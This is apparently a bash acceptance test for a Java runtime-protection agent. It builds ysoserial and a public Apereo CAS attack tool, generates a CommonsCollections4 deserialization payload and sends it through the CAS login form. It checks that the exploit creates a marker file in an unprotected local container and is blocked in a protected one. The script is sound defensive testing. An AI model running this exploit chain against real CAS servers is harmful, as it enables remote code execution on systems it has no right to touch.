#!/usr/bin/env bash
set -euo pipefail

image="${OHMYRASP_VULHUB_APEREO_CAS_415_IMAGE:-vulhub/apereo-cas:4.1.5}"
baseline_name="${OHMYRASP_VULHUB_APEREO_CAS_415_BASELINE_NAME:-ohmyrasp-vulhub-cas415-baseline}"
protected_name="${OHMYRASP_VULHUB_APEREO_CAS_415_PROTECTED_NAME:-ohmyrasp-vulhub-cas415-protected}"
baseline_port="${OHMYRASP_VULHUB_APEREO_CAS_415_BASELINE_PORT:-18693}"
protected_port="${OHMYRASP_VULHUB_APEREO_CAS_415_PROTECTED_PORT:-18694}"
marker="${OHMYRASP_VULHUB_APEREO_CAS_415_MARKER:-/tmp/ohmyrasp-cas415-success}"
attack_dir="${OHMYRASP_APEREO_CAS_ATTACK_DIR:-/tmp/ohmyrasp-apereo-cas-attack}"
ysoserial_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
maven_jdk8_image="${OHMYRASP_MAVEN_JDK8_IMAGE:-maven:3.9-eclipse-temurin-8}"
attack_jar="${attack_dir}/target/apereo-cas-attack-1.0-SNAPSHOT-all.jar"

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd -- "${script_dir}/../.." && pwd)"
agent_root="${repo_root}/java-agent"
agent_jar="${agent_root}/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
work_dir="${OHMYRASP_VULHUB_APEREO_CAS_415_WORK_DIR:-/tmp/ohmyrasp-cas415}"
baseline_payload="${work_dir}/baseline-execution.txt"
protected_payload="${work_dir}/protected-execution.txt"
baseline_response="${work_dir}/baseline-exploit-response.html"
protected_response="${work_dir}/protected-exploit-response.html"
baseline_login="${work_dir}/baseline-login.html"
protected_login="${work_dir}/protected-login.html"
protected_logs="${work_dir}/protected-logs"
protected_log="${protected_logs}/events.jsonl"

cleanup() {
  docker rm -f "${baseline_name}" "${protected_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

prepare_ysoserial() {
  mkdir -p "${ysoserial_dir}"
  if [[ ! -s "${ysoserial_dir}/ysoserial.jar" ]]; then
    rm -rf "${ysoserial_dir}/src"
    docker run --rm -v "${ysoserial_dir}:/work" -w /work "${maven_jdk8_image}" \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
}

prepare_attack_tool() {
  prepare_ysoserial
  if [[ ! -f "${attack_dir}/pom.xml" ]]; then
    rm -rf "${attack_dir}"
    git clone --depth 1 https://github.com/vulhub/Apereo-CAS-Attack.git "${attack_dir}"
  fi
  docker run --rm \
    -v "${attack_dir}:/workspace" \
    -v "${ysoserial_dir}/ysoserial.jar:/tmp/ysoserial.jar:ro" \
    -w /workspace \
    "${maven_jdk8_image}" \
    sh -c 'mvn -q org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=/tmp/ysoserial.jar -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.6 -Dpackaging=jar -DlocalRepositoryPath=my-repo && mvn -q clean package assembly:single'
  if [[ ! -s "${attack_jar}" ]]; then
    echo "missing built Apereo CAS attack jar: ${attack_jar}" >&2
    exit 1
  fi
}

generate_execution_payload() {
  local output_file="$1"
  docker run --rm \
    -v "${attack_jar}:/opt/apereo-cas-attack.jar:ro" \
    "${maven_jdk8_image}" \
    java -jar /opt/apereo-cas-attack.jar CommonsCollections4 "touch ${marker}" \
    >"${output_file}"
  if [[ "$(wc -c <"${output_file}")" -lt 1000 ]]; then
    echo "Apereo CAS attack tool generated an unexpectedly short payload" >&2
    cat "${output_file}" >&2 || true
    exit 1
  fi
}

wait_for_login() {
  local port="$1"
  local name="$2"
  local output="$3"
  for attempt in $(seq 1 120); do
    local status
    status="$(curl -sS -o "${output}" -w '%{http_code}' "http://127.0.0.1:${port}/cas/login" 2>/dev/null || true)"
    if [[ "${status}" == "200" ]] && grep -Eq 'name="(lt|execution)"' "${output}"; then
      return 0
    fi
    sleep 2
  done
  echo "Apereo CAS ${name} did not expose /cas/login" >&2
  docker logs --tail 200 "${name}" >&2 || true
  return 1
}

send_login_payload() {
  local port="$1"
  local payload_file="$2"
  local response_file="$3"
  python3 - "${port}" "${payload_file}" "${response_file}" <<'PY'
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

port = sys.argv[1]
payload_file = sys.argv[2]
response_file = sys.argv[3]
base = f"http://127.0.0.1:{port}"
payload = open(payload_file, encoding="utf-8").read().strip()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)


def request(path, raw_body=None):
    body = None
    headers = {"User-Agent": "ohmyrasp-cas415"}
    if raw_body is not None:
        body = raw_body.encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(base + path, data=body, headers=headers)
    try:
        with opener.open(req, timeout=40) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")


status, login = request("/cas/login")
lt = re.search(r'name="lt" value="([^"]+)"', login)
execution = re.search(r'name="execution" value="([^"]+)"', login)
if not lt or not execution:
    raise SystemExit("missing CAS login lt/execution fields")
raw = (
    urllib.parse.urlencode(
        [
            ("username", "test"),
            ("password", "test"),
            ("lt", lt.group(1)),
        ]
    )
    + "&execution="
    + payload
    + "&_eventId=submit&submit=LOGIN"
)
status, body = request("/cas/login", raw)
with open(response_file, "w", encoding="utf-8") as handle:
    handle.write(body)
print(status)
PY
}

deserialization_block_count() {
  grep -Ec '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "${protected_log}" 2>/dev/null || true
}

docker run --rm \
  -v "${agent_root}:/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "${work_dir}"
mkdir -p "${protected_logs}"
: >"${protected_log}"
chmod 777 "${protected_logs}"
chmod 666 "${protected_log}"
cleanup
prepare_attack_tool
generate_execution_payload "${baseline_payload}"
generate_execution_payload "${protected_payload}"

docker run -d \
  --name "${baseline_name}" \
  -p "${baseline_port}:8080" \
  "${image}" >/dev/null

wait_for_login "${baseline_port}" "${baseline_name}" "${baseline_login}"
docker exec "${baseline_name}" rm -f "${marker}"
baseline_status="$(send_login_payload "${baseline_port}" "${baseline_payload}" "${baseline_response}")"
for _ in $(seq 1 20); do
  if docker exec "${baseline_name}" test -f "${marker}"; then
    break
  fi
  sleep 1
done
if ! docker exec "${baseline_name}" test -f "${marker}"; then
  echo "baseline Apereo CAS 4.1 encrypted execution state did not create ${marker}; status=${baseline_status}" >&2
  cat "${baseline_response}" >&2 || true
  docker logs --tail 160 "${baseline_name}" >&2 || true
  exit 1
fi

docker run -d \
  --name "${protected_name}" \
  -p "${protected_port}:8080" \
  -v "${agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "${protected_logs}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "${image}" >/dev/null

wait_for_login "${protected_port}" "${protected_name}" "${protected_login}"
if ! grep -q '"deserialization_hook":"installed"' "${protected_log}"; then
  echo "protected Apereo CAS Java8 agent did not report installed deserialization hook" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "${protected_log}"; then
  echo "protected Apereo CAS logged a detection before the exploit request" >&2
  cat "${protected_log}" >&2
  exit 1
fi

docker exec "${protected_name}" rm -f "${marker}"
before_count="$(deserialization_block_count)"
protected_status="$(send_login_payload "${protected_port}" "${protected_payload}" "${protected_response}")"
for _ in $(seq 1 20); do
  after_count="$(deserialization_block_count)"
  if [[ "${after_count}" -gt "${before_count}" ]]; then
    break
  fi
  sleep 1
done
after_count="$(deserialization_block_count)"
if [[ "${after_count}" -le "${before_count}" ]]; then
  echo "missing java8_deserialization_gadget_class block event for Apereo CAS 4.1; status=${protected_status}" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi
if docker exec "${protected_name}" test -f "${marker}"; then
  echo "protected Apereo CAS 4.1 created ${marker} despite Java8 RASP; status=${protected_status}" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi
if ! grep -Fq '"class":"org.apache.commons.collections4.functors.ChainedTransformer"' "${protected_log}"; then
  echo "Apereo CAS 4.1 block event did not identify CommonsCollections4 ChainedTransformer" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

echo "vulhub Apereo CAS 4.1 Java8 acceptance passed"
